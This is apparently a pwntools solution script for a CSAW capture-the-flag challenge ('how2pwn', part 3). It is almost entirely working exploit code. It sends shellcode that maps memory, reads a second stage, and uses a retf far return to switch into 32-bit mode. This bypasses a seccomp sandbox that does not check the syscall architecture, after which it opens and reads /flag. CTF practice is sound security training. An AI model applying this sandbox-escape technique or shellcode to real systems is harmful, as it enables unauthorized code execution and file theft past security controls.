# Ticket
#8e7bd9e37e38a85551d969e29b77e1ce

# Hints
from pwn import *
# context.log_level='debug'
debug = 0
if debug:
    p = process("./chal3")
else:
    p = remote("how2pwn.chal.csaw.io",60003)
   # p = remote("0.0.0.0", 60003)
with open("./ticket3",'r') as f:
    ticket = f.read().strip()
p.send(ticket)

# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# 1. In this challenge, you can't open a file because of the strict sandbox
# 2. But there is a vul about the sanbox, it doesn't check the syscall arch.
# 3. We can use x86 syscalls to bypass it. All x86 syscalls: https://syscalls32.paolostivanin.com/
# 4. You may find x86 can't visite x64 address because x64 address is too long to be stored in the x86 register. However, we still have syscall_mmap, which could allocate a chunk of memory, for example 0xcafe000, so we can visite this address in x86 mode. 
# 5. There is a demo for retf: https://github.com/n132/n132.github.io/blob/master/code/GoogleCTF/S2/XxX/pwn.S


context.arch = 'amd64'

shellcode = f'''
xor rax,rax
mov al, 0x9
mov rdi,0x11220000
mov rsi,0x3000
mov rdx,0x7
mov r10,0x21
xor r8,r8
xor r9,r9
syscall

xor rdi,rdi
mov rsi,0x11220000
mov rdx,0x1000
xor rax, rax
syscall

mov eax,0x11220000
mov rbx,0x2300000000
xor rax,rbx
push rax
'''

#gdb.attach(p)
shellcode = asm(shellcode)+b'\xcb'# \xcb is retf
print("[+] len of shellcode: "+str(len(shellcode)))
p.sendafter(": \n",shellcode.ljust(0x100,b'\0'))

context.arch='i386'
context.bits=32

flag_path_1 = hex(u32(b"/fla"))
flag_path_2 = hex(u32(b"g\0\0\0"))


shellcode = f'''
mov esp, 0x11221000
'''
shellcode += shellcraft.open("/flag")
shellcode += shellcraft.read(2,'esp',0x2000)
shellcode += shellcraft.write(1,'esp',0x2000)
p.send(asm(shellcode))

p.interactive()
p.close()
